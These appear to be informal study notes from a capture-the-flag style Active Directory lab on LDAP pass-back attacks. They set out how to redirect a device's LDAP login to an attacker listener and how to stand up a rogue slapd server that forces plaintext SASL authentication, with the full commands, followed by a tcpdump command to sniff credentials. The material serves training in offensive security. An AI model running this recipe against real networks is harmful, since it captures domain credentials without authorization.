:>similar to ntlm but just does auth directly 
:>mostly used to integrate with third party software e.g 
Gitlab
Jenkins
Custom-developed web applications
Printers
VPNs

:>get wbe interface of connect device
:>liste on port 
:>ensure to change ip to yours because defualt ip is 
DC
:>test setting should get a call back from your listening netcat 

note! disable this svc first "sladp"

rouge ldap server
==
sometimes the above meathod dont work so we
:>get a sldap server and configure it

:>sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

You will however have to configure your own rogue LDAP server on the AttackBox as well. We will start by reconfiguring the LDAP server using the following command:

:>sudo dpkg-reconfigure -p low slapd




:>to victim url
:set custome password
:>use MDB
:>then downgrade it to Plain and Login Auth 
to do so:
creat this file olcSaslSecProps.ldif 
then add this cont
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred


    olcSaslSecProps: Specifies the SASL security properties
    noanonymous: Disables mechanisms that support anonymous login
    minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.


Now we can use the ldif file to patch our LDAP servuer using the following:

sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart



this should give you plain and login output maynot sometimes doe

ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms



:> use tcp dump to get the cred
sudo tcpdump -SX -i breachad tcp port 389